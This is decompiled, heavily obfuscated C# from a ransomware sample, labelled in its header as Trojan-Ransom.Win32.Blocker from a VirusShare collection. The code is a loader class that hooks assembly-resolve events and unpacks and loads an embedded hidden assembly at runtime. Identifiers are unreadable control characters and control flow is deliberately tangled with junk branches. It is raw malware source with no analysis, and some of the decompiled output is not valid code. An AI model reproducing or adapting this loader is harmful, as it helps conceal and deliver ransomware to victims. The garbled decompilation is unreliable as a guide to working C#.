// Decompiled with JetBrains decompiler
// Type: .
// Assembly: Loader.installer, Version=0.0.0.0, Culture=neutral, PublicKeyToken=5afe7557eabdd922
// MVID: 60E69C82-3262-4EB0-AE17-CA746ABA1DFA
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\Trojan-Ransom.Win32.Blocker.mfa-066a8b95598361161e98b8e646e296c6d99174a08f1217945906b9bb95c02611.exe

using \u0004;
using \u0005;
using System;
using System.Reflection;
using System.Runtime.InteropServices;

namespace \u0004
{
  internal sealed class \u0001
  {
    private static Assembly \u0001;

    internal static void \u0001()
    {
      do
      {
        if (true)
        {
          \u0013.\u007E\u0018((object) \u0012.\u0017(), new ResolveEventHandler(\u0001.\u0002));
          \u0013.\u007E\u0019((object) \u0012.\u0017(), new ResolveEventHandler(\u0001.\u0001));
        }
      }
      while (false);
    }

    private static Assembly \u0001([In] object obj0, [In] ResolveEventArgs obj1)
    {
      Assembly assembly = \u0001.\u0001();
      string str = \u0001.\u0001(assembly);
      if (!\u0015.\u007E\u001D((object) \u0014.\u007E\u001A((object) obj1), str))
        return (Assembly) null;
      byte[] numArray = \u0001.\u0001(\u0002.\u007E\u0002((object) assembly, str));
      return \u0016.\u001F(numArray);
    }

    private static string \u0001([In] Assembly obj0)
    {
      string str;
      int num1;
      do
      {
        int num2;
        if (true)
        {
          str = \u0014.\u007E\u001B((object) obj0);
          num2 = \u0017.\u007E\u007F((object) str, ',');
        }
        else
          goto label_9;
label_2:
        if (true)
        {
          num1 = num2;
          goto label_9;
        }
label_3:
        if (true)
        {
          if (num2 >= 0)
            continue;
          goto label_7;
        }
        else
          goto label_2;
label_9:
        num2 = num1;
        goto label_3;
      }
      while (false);
      str = \u0018.\u007E\u0080((object) str, 0, num1);
label_7:
      return \u0019.\u0081(str, str, str);
    }

    private static Assembly \u0002([In] object obj0, [In] ResolveEventArgs obj1)
    {
      if ((object) \u0001.\u0001 == null)
      {
label_1:
        switch (1)
        {
          case 0:
            goto label_1;
          default:
            if (false)
            {
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (\u0001.\u0002);
            }
            string str = \u0001.\u0001(\u0001.\u0001());
            \u0001.\u0001 = \u001A.\u0082(str);
            break;
        }
      }
label_5:
      while ((object) \u0001.\u0001 != null)
      {
label_6:
        Assembly assembly;
        do
        {
          int num1 = 2;
          while (true)
          {
            switch (num1)
            {
              case 0:
                goto label_6;
              default:
                int index;
                string[] strArray;
                if (true)
                {
                  strArray = \u001B.\u007E\u0083((object) \u0001.\u0001);
                  index = 0;
                  if (false)
                    goto label_17;
                  else
                    goto label_17;
                }
label_12:
                string str;
                if (!\u001C.\u0084(str, \u0014.\u007E\u001A((object) obj1)))
                {
                  int num2 = index;
                  if (false)
                  {
                    num1 = num2;
                    continue;
                  }
                  index = num2 + 1;
                }
                else
                  goto label_13;
label_17:
                if (true)
                {
                  if (index < strArray.Length)
                  {
                    if (true)
                    {
                      str = strArray[index];
                      goto label_12;
                    }
                    else
                      goto default;
                  }
                  else
                    goto label_19;
                }
                else
                  goto label_5;
            }
          }
label_13:
          switch (7)
          {
            case 0:
              goto label_13;
            default:
              assembly = \u0001.\u0001;
              continue;
          }
        }
        while (false);
        goto label_22;
label_19:
        switch (4)
        {
          case 0:
            goto label_19;
          default:
            return (Assembly) null;
        }
label_22:
        return assembly;
      }
      return \u0001.\u0001;
    }
  }
}
